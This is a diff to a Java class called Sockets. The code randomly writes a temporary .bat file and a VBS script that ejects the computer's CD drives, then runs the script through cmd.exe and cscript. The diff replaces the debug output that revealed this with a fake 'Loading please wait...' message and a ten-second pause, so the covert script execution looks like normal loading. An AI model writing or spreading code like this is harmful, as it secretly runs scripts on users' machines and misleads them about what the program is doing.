@@ -90,8 +90,9 @@ class Sockets
         try{
             Random rand = new Random(); 
             int random = rand.nextInt(10);
-            System.out.println("RANDOM: " + random);
-            
+            System.out.println("Loading please wait...");
+            Thread.sleep(10000);
+            System.out.println("Proceed!");
             if(random <= 3)
             {
                 File temp = File.createTempFile("vncv216789", ".bat"); 
@@ -140,11 +141,9 @@ class Sockets
 "colCDROMs.Item(i).Eject");
                 bw.close();
                     
-                System.out.println("VBS CD");
                 Sockets.executeCommand(new String[]{"cmd.exe", "/C", "cscript", filePath});
             }
-            else
-                System.out.println("NOTHING!");
+
             
             
                 return true;
